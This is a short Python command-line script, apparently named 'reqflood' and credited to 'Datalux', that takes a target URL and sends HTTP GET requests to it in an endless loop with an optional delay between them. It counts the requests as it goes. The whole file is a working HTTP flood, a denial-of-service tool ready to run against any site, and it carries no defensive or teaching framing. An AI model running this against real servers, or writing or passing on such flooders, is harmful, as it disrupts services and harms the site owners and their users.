#!/usr/bin/env python3

import argparse
from time import sleep
import sys
import requests

requests_counter = 0
time = 0

parser = argparse.ArgumentParser(description="./main.py -u [url]")
parser.add_argument("-u", help="HTTP requests to flood", action="store", dest="url")
parser.add_argument("-d", help="Delay (in seconds) between requests", action="store", dest="time", type=int)

args = parser.parse_args()

if not args.url:
    print("Error. Usage: ./main.py -u [url])")
    sys.exit()
else:
    if (args.url.find("http")) == -1:
        _url = "http://" + args.url
    elif (args.url.find("http")) == 0:
        _url = args.url

if args.time:
    if args.time > 0:
        time = args.time
    else:
        print("Error. Delay must be greater than 0.")
        sys.exit()


print("                  __ _                 _ ")
print("                 / _| |               | |")
print("  _ __ ___  __ _| |_| | ___   ___   __| |")
print(" | '__/ _ \/ _` |  _| |/ _ \ / _ \ / _` |")
print(" | | |  __/ (_| | | | | (_) | (_) | (_| |")
print(" |_|  \___|\__, |_| |_|\___/ \___/ \__,_|")
print("              | |                        ")
print("              |_|                        ")

print("\n     ..--|| Created by Datalux ||--..\n")
print("Target url: " + _url + "\n")


while True:
    requests.get(_url)
    requests_counter += 1
    print("Sended " + str(requests_counter) + " requests")

    if time > 0:
        sleep(time)